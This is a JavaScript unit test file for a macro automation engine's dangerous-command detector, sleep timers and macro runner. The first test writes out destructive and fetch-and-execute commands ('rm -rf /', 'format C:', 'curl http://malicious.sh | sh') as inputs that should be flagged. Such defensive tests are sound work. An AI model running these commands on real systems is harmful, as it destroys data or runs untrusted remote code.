/**
 * @fileoverview Unit tests for Macro Studio Automation Engine & Executors.
 */

'use strict';

const assert = require('assert');
const { isDangerous, sleep, runMacro, executors } = require('../src/macroEngine');

async function runTests() {
  console.log('--- Running Macro Engine & Executor Tests ---');

  // Test 1: Dangerous command heuristics
  assert.strictEqual(isDangerous('rm -rf /'), true);
  assert.strictEqual(isDangerous('sudo apt-get install'), true);
  assert.strictEqual(isDangerous('format C:'), true);
  assert.strictEqual(isDangerous('curl http://malicious.sh | sh'), true);
  assert.strictEqual(isDangerous('npm run dev'), false);
  assert.strictEqual(isDangerous('echo "hello world"'), false);

  // Test 2: Sleep timer completion
  const start = Date.now();
  await sleep(100);
  const elapsed = Date.now() - start;
  assert.ok(elapsed >= 90, `Elapsed time ${elapsed}ms should be at least 90ms`);

  // Test 3: Sleep timer abortion via AbortController
  const controller = new AbortController();
  const sleepPromise = sleep(1000, controller.signal);
  controller.abort();
  await assert.rejects(sleepPromise, /aborted/i);

  // Test 4: Mock macro execution with hooks and variable interpolation
  const mockMacro = {
    id: 'test-macro',
    name: 'Engine Test',
    variables: { TEST_TIME: '10' },
    actions: [
      { type: 'wait', value: 30 },
      { type: 'wait', value: 30 }
    ]
  };

  const statusEvents = [];
  const abortCtrl = new AbortController();

  const outcome = await runMacro(mockMacro, {
    signal: abortCtrl.signal,
    onStatus: (step, status) => {
      statusEvents.push({ step, status });
    },
    decide: async () => 'stop'
  });

  assert.strictEqual(outcome, 'finished');
  assert.strictEqual(statusEvents.length, 4); // 2 steps * (running, done)
  assert.strictEqual(statusEvents[0].status, 'running');
  assert.strictEqual(statusEvents[1].status, 'done');

  // Test 5: Step failure and interactive 'skip' decision
  const failingMacro = {
    id: 'failing-macro',
    name: 'Failure Test',
    actions: [
      { type: 'openUrl', value: 'not-a-valid-url' },
      { type: 'wait', value: 20 }
    ]
  };

  const failEvents = [];
  const outcomeSkip = await runMacro(failingMacro, {
    signal: new AbortController().signal,
    onStatus: (step, status) => {
      failEvents.push({ step, status });
    },
    decide: async (step) => {
      assert.strictEqual(step, 0);
      return 'skip';
    }
  });

  assert.strictEqual(outcomeSkip, 'finished');
  const skippedEvent = failEvents.find((e) => e.status === 'skipped');
  assert.ok(skippedEvent);

  // Test 6: Verify new executors exist
  assert.strictEqual(typeof executors.waitForUrl, 'function');
  assert.strictEqual(typeof executors.speak, 'function');
  assert.strictEqual(typeof executors.snapWindow, 'function');

  console.log('✓ All 6 Macro Engine & Executor tests passed successfully.');
}

if (require.main === module) {
  runTests().catch((err) => {
    console.error('Engine test failed:', err);
    process.exit(1);
  });
}

module.exports = { runTests };
